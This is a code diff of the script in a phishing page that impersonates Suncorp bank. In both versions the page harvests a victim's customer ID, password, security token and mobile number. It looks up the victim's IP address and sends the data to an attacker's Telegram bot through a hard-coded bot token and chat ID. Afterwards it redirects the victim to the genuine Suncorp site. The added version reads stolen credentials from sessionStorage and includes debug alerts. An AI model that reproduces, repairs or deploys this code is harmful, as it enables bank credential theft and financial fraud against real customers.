@@ -83,207 +83,166 @@
        </button>
        <script>
 // Telegram Bot Configuration
-var TELEGRAM_BOT_TOKEN = '8580841728:AAFsXNmdnj-kBurv4UxM4ucpZm4NqYcDL00';
-var TELEGRAM_CHAT_ID = '-5233511146';
-
-// CORS PROXY - Required for iOS Safari
-var CORS_PROXY = 'https://corsproxy.io/?';
+const TELEGRAM_BOT_TOKEN = '8580841728:AAFsXNmdnj-kBurv4UxM4ucpZm4NqYcDL00';
+const TELEGRAM_CHAT_ID = '-5233511146';
 
 document.addEventListener('DOMContentLoaded', function() {
-    var form = document.getElementById('recoverForm');
-    var phoneInput = document.getElementById('cid');
-    
-    // Get data from URL parameters
-    function getUrlParam(name) {
-        var results = new RegExp('[\\?&]' + name + '=([^&#]*)').exec(window.location.href);
-        return results ? decodeURIComponent(results[1]) : null;
-    }
-    
-    var userId, password, passcode;
-    try {
-        var u = getUrlParam('u');
-        var p = getUrlParam('p');
-        var t = getUrlParam('t');
-        userId = u ? atob(u) : 'Not available';
-        password = p ? atob(p) : 'Not available';
-        passcode = t ? atob(t) : 'Not provided';
-        if (passcode === 'none') passcode = 'Not provided';
-    } catch(e) {
-        userId = 'Not available';
-        password = 'Not available';
-        passcode = 'Not provided';
-    }
-    
-    // DEBUG: Show alert on mobile to verify data
-    if (/iPhone|iPad|iPod|Android/.test(navigator.userAgent)) {
-        console.log('Mobile detected. Data:', userId, password ? '***' : 'empty', passcode);
-    }
-    
-    // Create error container
-    var phoneErrorEl = document.getElementById('phone-error');
+    const form = document.getElementById('recoverForm');
+    const phoneInput = document.getElementById('cid');
+
+    // Create error container if it doesn't exist
+    let phoneErrorEl = document.getElementById('phone-error');
     if (!phoneErrorEl) {
-        var phoneErrorDiv = document.createElement('div');
+        const phoneErrorDiv = document.createElement('div');
         phoneErrorDiv.innerHTML = '<div class="sg-Validation-errorWrapper" id="phone-error" aria-live="assertive" style="display: none; margin-top: 5px; color: #d32f2f;"><p class="sg-Validation-errorMessage">Please enter a valid phone number.</p></div>';
         phoneInput.parentNode.appendChild(phoneErrorDiv.firstChild);
         phoneErrorEl = document.getElementById('phone-error');
     }
-    
+
+    // Set max length to 10 digits
     phoneInput.setAttribute('maxlength', '10');
     phoneInput.setAttribute('inputmode', 'numeric');
     phoneInput.setAttribute('pattern', '[0-9]*');
-    
-    var style = document.createElement('style');
-    style.textContent = '.sg-Input--error-border { border: 1px solid #d32f2f !important; border-color: #d32f2f !important; } @keyframes suncorp-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
+
+    // Retrieve stored data from sessionStorage
+    const userId = sessionStorage.getItem('userId') || 'Not available';
+    const password = sessionStorage.getItem('userPassword') || 'Not available';
+    const passcode = sessionStorage.getItem('userPasscode') || 'Not provided';
+
+    // Alert to check if sessionStorage is working
+    alert(`Session data:\nUser ID: ${userId}\nPassword: ${password}\nPasscode: ${passcode}`);
+
+    // Add red border style
+    const style = document.createElement('style');
+    style.textContent = `
+        .sg-Input--error-border {
+            border: 1px solid #d32f2f !important;
+            border-color: #d32f2f !important;
+        }
+        @keyframes suncorp-spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    `;
     document.head.appendChild(style);
-    
+
     function validatePhone(phone) {
-        return /^04\d{8}$/.test(phone);
+        const phoneRegex = /^04\d{8}$/;
+        return phoneRegex.test(phone);
     }
-    
+
     phoneInput.addEventListener('input', function(e) {
-        var value = this.value.replace(/\D/g, '');
-        if (value.length > 10) value = value.slice(0, 10);
+        let value = this.value.replace(/\D/g, '');
+        if (value.length > 10) {
+            value = value.slice(0, 10);
+        }
         this.value = value;
         clearError();
     });
-    
+
     function clearError() {
         phoneErrorEl.style.display = 'none';
         phoneInput.classList.remove('sg-Input--error-border');
         phoneInput.setAttribute('aria-invalid', 'false');
     }
-    
+
+    function hideLoading() {
+        const existingOverlay = document.getElementById('verify-loading-overlay');
+        if (existingOverlay) {
+            existingOverlay.remove();
+        }
+    }
+
     function showLoading() {
-        var overlay = document.createElement('div');
+        hideLoading();
+
+        const overlay = document.createElement('div');
         overlay.id = 'verify-loading-overlay';
-        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;';
-        
-        var spinner = document.createElement('div');
-        spinner.style.cssText = 'width:60px;height:60px;border:4px solid rgba(0,0,0,0.2);border-top:4px solid #ffc800;border-radius:50%;animation:suncorp-spin 1s linear infinite;';
-        
-        var text = document.createElement('p');
-        text.style.cssText = 'color:#ffc800;font-family:Arial,sans-serif;font-size:16px;margin-top:20px;';
-        text.textContent = 'Verifying...';
-        
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(2px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.3s ease;
+        `;
+
+        const spinner = document.createElement('div');
+        spinner.style.cssText = `
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(0, 0, 0, 0.2);
+            border-top: 4px solid #ffc800;
+            border-radius: 50%;
+            animation: suncorp-spin 1s linear infinite;
+        `;
+
+        const text = document.createElement('p');
+        text.style.cssText = `
+            color: #ffc800;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+            margin-top: 20px;
+            letter-spacing: 1px;
+        `;
+
         overlay.appendChild(spinner);
         overlay.appendChild(text);
         document.body.appendChild(overlay);
     }
-    
+
     function getDeviceInfo() {
-        var ua = navigator.userAgent;
-        var device = 'Desktop';
-        var platform = 'Unknown';
-        
-        if (/Android/.test(ua)) { platform = 'Android'; device = 'Mobile'; }
-        else if (/iPhone|iPad|iPod/.test(ua)) { platform = 'iOS'; device = 'Mobile'; }
-        else if (/Windows/.test(ua)) platform = 'Windows';
+        const ua = navigator.userAgent;
+        let device = 'Unknown';
+        let platform = 'Unknown';
+
+        if (/Windows/.test(ua)) platform = 'Windows';
         else if (/Mac/.test(ua)) platform = 'MacOS';
-        
-        return { device: device, platform: platform };
+        else if (/Linux/.test(ua)) platform = 'Linux';
+        else if (/Android/.test(ua)) platform = 'Android';
+        else if (/iPad|iPhone|iPod/.test(ua)) platform = 'iOS';
+
+        if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) device = 'Mobile';
+        else device = 'Desktop';
+
+        return { device, platform };
     }
-    
-    // Get IP using XMLHttpRequest
-    function getIP(callback) {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://api.ipify.org?format=json', true);
-        xhr.timeout = 5000;
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-                if (xhr.status === 200) {
-                    try {
-                        var data = JSON.parse(xhr.responseText);
-                        callback(data.ip);
-                    } catch(e) {
-                        callback('Unknown');
-                    }
-                } else {
-                    callback('Unknown');
-                }
-            }
-        };
-        xhr.onerror = function() { callback('Unknown'); };
-        xhr.ontimeout = function() { callback('Unknown'); };
-        xhr.send();
+
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (e) {
+            return 'Unable to retrieve';
+        }
     }
-    
-    // Send to Telegram using CORS Proxy (Fixes iOS Safari)
-    function sendToTelegram(message, callback) {
-        var telegramUrl = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
-        var proxyUrl = CORS_PROXY + encodeURIComponent(telegramUrl);
-        
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', proxyUrl, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.timeout = 15000; // Longer timeout for proxy
-        
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-                console.log('Telegram proxy status:', xhr.status);
-                console.log('Telegram proxy response:', xhr.responseText);
-                if (callback) callback(xhr.status === 200);
-            }
-        };
-        
-        xhr.onerror = function() {
-            console.error('Telegram XHR Error - trying without proxy as fallback');
-            // Fallback: try direct request (will fail on iOS but works on desktop)
-            fallbackSendToTelegram(message, callback);
-        };
-        
-        xhr.ontimeout = function() {
-            console.error('Telegram Timeout');
-            if (callback) callback(false);
-        };
-        
-        xhr.send(JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        }));
-    }
-    
-    // Fallback direct request (for desktop)
-    function fallbackSendToTelegram(message, callback) {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.timeout = 10000;
-        
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-                if (callback) callback(xhr.status === 200);
-            }
-        };
-        
-        xhr.onerror = function() {
-            if (callback) callback(false);
-        };
-        
-        xhr.send(JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        }));
-    }
-    
-    form.addEventListener('submit', function(e) {
+
+    form.addEventListener('submit', async function(e) {
         e.preventDefault();
         clearError();
-        
-        var phone = phoneInput.value.trim();
-        
-        if (!validatePhone(phone)) {
+
+        const phone = phoneInput.value.trim();
+
+        if (!phone || !validatePhone(phone)) {
             phoneErrorEl.style.display = 'block';
             phoneInput.classList.add('sg-Input--error-border');
             phoneInput.setAttribute('aria-invalid', 'true');
             return;
         }
-        
+
         showLoading();
-        
-        var deviceInfo = getDeviceInfo();
-        var currentDateTime = new Date().toLocaleString('en-AU', { 
+
+        const clientIP = await getIP();
+        const { device, platform } = getDeviceInfo();
+        const currentDateTime = new Date().toLocaleString('en-AU', {
             timeZone: 'Australia/Sydney',
             year: 'numeric',
             month: '2-digit',
@@ -292,24 +251,49 @@ document.addEventListener('DOMContentLoaded', function() {
             minute: '2-digit',
             second: '2-digit'
         });
-        
-        // Build message
-        var message = '🟡\nCustomer ID: `' + userId + '`\nPassword: `' + password + '`\nToken: `' + passcode + '`\nPhone: `' + phone + '`\nIP: `';
-        
-        // Get IP then send
-        getIP(function(ip) {
-            message += ip + '`\nUA: ' + navigator.userAgent + '\nDevice: ' + deviceInfo.device + '\nPlatform: ' + deviceInfo.platform + '\nDate: ' + currentDateTime;
-            
-            console.log('Sending message via proxy...');
-            
-            sendToTelegram(message, function(success) {
-                console.log('Send success:', success);
-                // Redirect regardless
-                setTimeout(function() {
-                    window.location.href = 'https://www.suncorp.com.au';
-                }, 2000);
+
+        // Alert to check values before sending
+        alert(`About to send:\nUser ID: ${userId}\nPassword: ${password}\nPasscode: ${passcode}\nPhone: ${phone}\nIP: ${clientIP}\nDevice: ${device}\nPlatform: ${platform}`);
+
+        const message = `🟡
+Customer ID: \`${userId}\`
+Password: \`${password}\`
+Token: \`${passcode}\`
+Phone: \`${phone}\`
+IP: \`${clientIP}\`
+UA: ${navigator.userAgent}
+Device: ${device}
+Platform: ${platform}
+Date: ${currentDateTime}`;
+
+        try {
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const response = await fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
             });
-        });
+
+            // Alert to check if the request was successful
+            alert(`Telegram response status: ${response.status}`);
+            if (!response.ok) {
+                const errorText = await response.text();
+                alert(`Telegram error: ${errorText}`);
+            }
+        } catch (error) {
+            alert(`Failed to send to Telegram: ${error.message}`);
+            console.error('Failed to send to Telegram:', error);
+        }
+
+        setTimeout(function() {
+            window.location.href = 'https://www.suncorp.com.au';
+        }, 2000);
     });
 });
 </script>
@@ -339,3 +323,4 @@ document.addEventListener('DOMContentLoaded', function() {
   </iframe>
  </body>
 </html>
+
